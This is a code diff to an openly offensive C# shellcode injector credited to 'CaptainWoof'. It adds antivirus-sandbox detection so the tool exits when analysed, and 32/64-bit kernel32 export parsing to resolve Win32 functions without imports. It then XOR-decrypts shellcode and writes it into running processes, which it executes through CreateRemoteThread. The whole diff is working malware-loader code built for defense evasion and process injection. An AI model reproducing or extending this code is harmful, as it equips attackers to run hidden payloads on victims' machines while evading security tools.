@@ -5,10 +5,11 @@ using System.IO;
 using System.Net;
 using System.Runtime.InteropServices;
 using System.Text;
+using AVEvasion;
 
 namespace XorEncryptedShellcodeInjector
 {
-    class Program
+    public class Program
     {
         // Needed flags
         [Flags]
@@ -431,13 +432,27 @@ namespace XorEncryptedShellcodeInjector
         }
 
         // Get function addresses
-        private static void GetFunctionAddreses(ref IntPtr OpenProcessAddr, ref IntPtr VirtualAllocExAddr, ref IntPtr CreateRemoteThreadAddr, ref IntPtr WriteProcessMemoryAddr, ref IntPtr CloseHandleAddr, ref IntPtr VirtualFreeExAddr)
+        private static Boolean GetFunctionAddreses(ref IntPtr OpenProcessAddr, ref IntPtr VirtualAllocExAddr, ref IntPtr CreateRemoteThreadAddr, ref IntPtr WriteProcessMemoryAddr, ref IntPtr CloseHandleAddr, ref IntPtr VirtualFreeExAddr)
         {
             // Get 'Kernel32.dll' image base address
             IntPtr Kernel32BaseAddr = FindKernel32();
             IMAGE_DOS_HEADER ImageDosHeader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(Kernel32BaseAddr, typeof(IMAGE_DOS_HEADER));
-            IMAGE_OPTIONAL_HEADER64 PEHeader = (IMAGE_OPTIONAL_HEADER64)Marshal.PtrToStructure((IntPtr)(Kernel32BaseAddr.ToInt64() + ImageDosHeader.e_lfanew + 4 + 20), typeof(IMAGE_OPTIONAL_HEADER64));
-            IMAGE_EXPORT_DIRECTORY ImageExportDirectory = (IMAGE_EXPORT_DIRECTORY)Marshal.PtrToStructure((IntPtr)(Kernel32BaseAddr.ToInt64() + (int)PEHeader.ExportTable.VirtualAddress), typeof(IMAGE_EXPORT_DIRECTORY));
+            MagicType Architecture = (MagicType)Marshal.ReadInt32((IntPtr)(Kernel32BaseAddr.ToInt64() + ImageDosHeader.e_lfanew + 4 + 20));
+            IMAGE_EXPORT_DIRECTORY ImageExportDirectory;
+            switch (Architecture)
+            {
+                case MagicType.IMAGE_NT_OPTIONAL_HDR32_MAGIC:
+                    IMAGE_OPTIONAL_HEADER32 PEHeader32 = (IMAGE_OPTIONAL_HEADER32)Marshal.PtrToStructure((IntPtr)(Kernel32BaseAddr.ToInt64() + ImageDosHeader.e_lfanew + 4 + 20), typeof(IMAGE_OPTIONAL_HEADER32));
+                    ImageExportDirectory = (IMAGE_EXPORT_DIRECTORY)Marshal.PtrToStructure((IntPtr)(Kernel32BaseAddr.ToInt64() + (int)PEHeader32.ExportTable.VirtualAddress), typeof(IMAGE_EXPORT_DIRECTORY));
+                    break;
+                case MagicType.IMAGE_NT_OPTIONAL_HDR64_MAGIC:
+                    IMAGE_OPTIONAL_HEADER64 PEHeader64 = (IMAGE_OPTIONAL_HEADER64)Marshal.PtrToStructure((IntPtr)(Kernel32BaseAddr.ToInt64() + ImageDosHeader.e_lfanew + 4 + 20), typeof(IMAGE_OPTIONAL_HEADER64));
+                    ImageExportDirectory = (IMAGE_EXPORT_DIRECTORY)Marshal.PtrToStructure((IntPtr)(Kernel32BaseAddr.ToInt64() + (int)PEHeader64.ExportTable.VirtualAddress), typeof(IMAGE_EXPORT_DIRECTORY));
+                    break;
+                default:
+                    Console.WriteLine("Failed to identify 'kernel32.dll' architecture");
+                    return false;
+            };
 
             // Setup variables for iterating over export table
             int CurrentFunctionNameAddr;
@@ -479,23 +494,25 @@ namespace XorEncryptedShellcodeInjector
                 // Return if all functions have been found
                 if ((OpenProcessAddr != IntPtr.Zero) && (VirtualAllocExAddr != IntPtr.Zero) && (CreateRemoteThreadAddr != IntPtr.Zero) && (WriteProcessMemoryAddr != IntPtr.Zero) && (CloseHandleAddr != IntPtr.Zero) && (VirtualFreeExAddr != IntPtr.Zero))
                 {
-                    break;
+                    return true;
                 }
             }
+            return false;
         }
 
         // Show-Usage functions
         public static void PrintUsage()
         {
             string ProgramName = Process.GetCurrentProcess().ProcessName;
-            Console.WriteLine(string.Format("Usage: {0} <Shellcode_source> <decryption_key> <target_pid>", ProgramName));
+            Console.WriteLine(string.Format("Usage: {0} <Shellcode_source> <decryption_key> <target_pid|target_processname> [--skip-av-sandbox-check]", ProgramName));
             Console.WriteLine("Use '--help-detailed' for more details");
+            Console.WriteLine("Use '--skip-av-sandbox-check' to skip the AV sandbox detection stage");
         }
 
         public static void PrintDetailedHelp()
         {
             string Help = @"
-Usage: {0} <Shellcode_source> <decryption_key> <target_pid|target_processname>
+Usage: {0} <Shellcode_source> <decryption_key> <target_pid|target_processname> [--skip-av-sandbox-check]
 
 Injects chosen shellcode into an already running process. Provided shellcode MUST BE xor-encrypted, and the decryption key must be provided. No files will be written to the disk.
 
@@ -526,7 +543,7 @@ It can be either a string, a file on the local system or a remote system in the 
         // Main
         public static void Main(string[] args)
         {
-            // XorEncryptedShellcodeInjector <Shellcode_source> <key_to_decrypt> <pid|processname>
+            // XorEncryptedShellcodeInjector <Shellcode_source> <key_to_decrypt> <pid|processname>            
 
             // Help section
             string WholeArg = "";
@@ -538,11 +555,21 @@ It can be either a string, a file on the local system or a remote system in the 
             {
                 PrintDetailedHelp();
                 return;
-            }
-            else if ((args.Length != 3) || WholeArg.ToLower().Contains("--help") || WholeArg.ToLower().Contains("-h"))
+            }            
+            else if ((args.Length < 3) || WholeArg.ToLower().Contains("--help") || WholeArg.ToLower().Contains("-h"))
             {
                 PrintUsage();
                 return;
+            }
+
+            // Check if running in AV Sandbox
+            if (!WholeArg.Contains("--skip-av-sandbox-check"))
+            {
+                Console.WriteLine("Checking if running in an AV sandbox...");
+                if (Heuristics.IsRunningInAVSandbox())
+                {
+                    return;
+                }
             }
 
             // Check if target process(es) is running
@@ -575,7 +602,10 @@ It can be either a string, a file on the local system or a remote system in the 
 
             // Arrange for the needed Win32 API funcs (D/Invoke)
             IntPtr OpenProcessAddr = IntPtr.Zero, VirtualAllocExAddr = IntPtr.Zero, CreateRemoteThreadAddr = IntPtr.Zero, WriteProcessMemoryAddr = IntPtr.Zero, CloseHandleAddr = IntPtr.Zero, VirtualFreeExAddr = IntPtr.Zero;
-            GetFunctionAddreses(ref OpenProcessAddr, ref VirtualAllocExAddr, ref CreateRemoteThreadAddr, ref WriteProcessMemoryAddr, ref CloseHandleAddr, ref VirtualFreeExAddr);
+            if(!GetFunctionAddreses(ref OpenProcessAddr, ref VirtualAllocExAddr, ref CreateRemoteThreadAddr, ref WriteProcessMemoryAddr, ref CloseHandleAddr, ref VirtualFreeExAddr)){
+                Console.WriteLine("Failed to get needed function addresess");
+                return;
+            }
             OpenProcessDelegate OpenProcess = (OpenProcessDelegate)Marshal.GetDelegateForFunctionPointer(OpenProcessAddr, typeof(OpenProcessDelegate));
             VirtualAllocExDelegate VirtualAllocEx = (VirtualAllocExDelegate)Marshal.GetDelegateForFunctionPointer(VirtualAllocExAddr, typeof(VirtualAllocExDelegate));
             CreateRemoteThreadDelegate CreateRemoteThread = (CreateRemoteThreadDelegate)Marshal.GetDelegateForFunctionPointer(CreateRemoteThreadAddr, typeof(CreateRemoteThreadDelegate));
@@ -655,70 +685,81 @@ It can be either a string, a file on the local system or a remote system in the 
             {
                 Console.WriteLine("FAILED !");
                 return;
-            }            
+            }
 
-            // Decrypt and inject bytes sequentially
-            Console.WriteLine("Decrypting and injecting shellcode in target process(es)...");
-            foreach (Process P in TargetProcesses)
+            // Decrypt shellcode
+            Console.Write("Decrypting shellcode: ");
+            IntPtr BytesWritten = IntPtr.Zero;
+            byte[] ShellcodeDecrypted = new byte[ShellcodeEncrypted.Length];
+
+            for (int i = 0; i < ShellcodeDecrypted.Length; i++)
             {
-                Console.Write(string.Format("\t> Trying '{0}'({1}): ", P.ProcessName, P.Id));
-                IntPtr TargetProcessH = OpenProcess(ProcessAccessFlags.CreateThread | ProcessAccessFlags.QueryInformation | ProcessAccessFlags.VirtualMemoryOperation | ProcessAccessFlags.VirtualMemoryRead | ProcessAccessFlags.VirtualMemoryWrite, true, P.Id);
-                if (TargetProcessH == IntPtr.Zero)
-                {
-                    Console.WriteLine(string.Format("Error {0} opening handle to target process", GetLastError()));
-                    continue;
-                }
+                ShellcodeDecrypted[i] = (byte)(DecryptionKey[i % DecryptionKey.Length] ^ ShellcodeEncrypted[i]);
+            }
+            Console.WriteLine("DONE");
 
-                IntPtr AllocatedMemoryP = VirtualAllocEx(TargetProcessH, IntPtr.Zero, (uint)ShellcodeEncrypted.Length,
-                    AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
-                if (AllocatedMemoryP == IntPtr.Zero)
+            // Inject shellcode
+            try
+            {
+                Console.WriteLine("Injecting shellcode in target process(es)...");
+                foreach (Process P in TargetProcesses)
                 {
-                    Console.WriteLine(string.Format("Error {0} allocating memory in target process", GetLastError()));
-                    CloseHandle(TargetProcessH);
-                    continue;
-                }
+                    Console.Write(string.Format("\t> Trying '{0}'({1}): ", P.ProcessName, P.Id));
+                    IntPtr TargetProcessH = OpenProcess(ProcessAccessFlags.CreateThread | ProcessAccessFlags.QueryInformation | ProcessAccessFlags.VirtualMemoryOperation | ProcessAccessFlags.VirtualMemoryRead | ProcessAccessFlags.VirtualMemoryWrite, true, P.Id);
+                    if (TargetProcessH == IntPtr.Zero)
+                    {
+                        Console.WriteLine(string.Format("Error {0} opening handle to target process", GetLastError()));
+                        continue;
+                    }
 
-                IntPtr BytesWritten = IntPtr.Zero;
-                int TotalBytesWritten = 0;
-                byte[] DecryptedByteToWrite = new byte[1];
-                for(int i = 0; i < ShellcodeEncrypted.Length; i++)
-                {
-                    DecryptedByteToWrite[0] = (byte)(DecryptionKey[i % DecryptionKey.Length] ^ ShellcodeEncrypted[i]);
-                    if (!WriteProcessMemory(TargetProcessH, (System.IntPtr)((Int64)AllocatedMemoryP+i), DecryptedByteToWrite, 1, out BytesWritten))
+                    IntPtr AllocatedMemoryP = VirtualAllocEx(TargetProcessH, IntPtr.Zero, (uint)ShellcodeEncrypted.Length,
+                        AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
+                    if (AllocatedMemoryP == IntPtr.Zero)
+                    {
+                        Console.WriteLine(string.Format("Error {0} allocating memory in target process", GetLastError()));
+                        CloseHandle(TargetProcessH);
+                        continue;
+                    }                   
+
+                    // Inject shellcode to target process
+                    if (!WriteProcessMemory(TargetProcessH, AllocatedMemoryP, ShellcodeDecrypted, ShellcodeDecrypted.Length, out BytesWritten))
                     {
                         Console.WriteLine(string.Format("Error {0} writing shellcode to process memory", GetLastError()));
                         VirtualFreeEx(TargetProcessH, AllocatedMemoryP, 0, AllocationType.Release | AllocationType.Decommit);
                         CloseHandle(TargetProcessH);
                         continue;
                     }
-                    if((int)BytesWritten == 1)
+                    
+                    if ((int)BytesWritten != ShellcodeDecrypted.Length)
                     {
-                        TotalBytesWritten += 1;
+                        Console.WriteLine(string.Format("Error {0} writing full shellcode to process memory", GetLastError()));
+                        VirtualFreeEx(TargetProcessH, AllocatedMemoryP, 0, AllocationType.Release | AllocationType.Decommit);
+                        CloseHandle(TargetProcessH);
+                        continue;
                     }
-                }
-                if (TotalBytesWritten != ShellcodeEncrypted.Length)
-                {
-                    Console.WriteLine(string.Format("Error {0} writing full shellcode to process memory", GetLastError()));
-                    VirtualFreeEx(TargetProcessH, AllocatedMemoryP, 0, AllocationType.Release | AllocationType.Decommit);
-                    CloseHandle(TargetProcessH);
-                    continue;
-                }
+                    Console.WriteLine("DONE");
 
-                // Start execution of the shellcode
-                IntPtr NewThreadId;
-                IntPtr NewThreadH = CreateRemoteThread(TargetProcessH, IntPtr.Zero, 0, AllocatedMemoryP, IntPtr.Zero, 0, out NewThreadId);
-                if (NewThreadH == IntPtr.Zero)
-                {
-                    Console.WriteLine(string.Format("Error {0} creating new thread in target process", GetLastError()));
-                    VirtualFreeEx(TargetProcessH, AllocatedMemoryP, 0, AllocationType.Release);
+                    // Start execution of the shellcode
+                    Console.Write("Spawning new thread in target process: ");
+                    IntPtr NewThreadId = IntPtr.Zero;
+                    IntPtr NewThreadH = CreateRemoteThread(TargetProcessH, IntPtr.Zero, 0, AllocatedMemoryP, IntPtr.Zero, 0, out NewThreadId);
+                    if (NewThreadH == IntPtr.Zero)
+                    {
+                        Console.WriteLine(string.Format("Error {0}", GetLastError()));
+                        VirtualFreeEx(TargetProcessH, AllocatedMemoryP, 0, AllocationType.Release);
+                        CloseHandle(TargetProcessH);
+                        continue;
+                    }
+                    CloseHandle(NewThreadH);
                     CloseHandle(TargetProcessH);
-                    continue;
+                    Console.WriteLine("SUCCESS !\n\nWritten by CaptainWoof");
+                    break;
                 }
-                CloseHandle(NewThreadH);
-                CloseHandle(TargetProcessH);
-                Console.WriteLine("SUCCESS !\n\nWritten by CaptainWoof");
-                break;
             }
+            catch(Exception exception)
+            {
+                Console.WriteLine(string.Format("\n\n{0}",exception.Message));
+            }   
         }
     }
 }
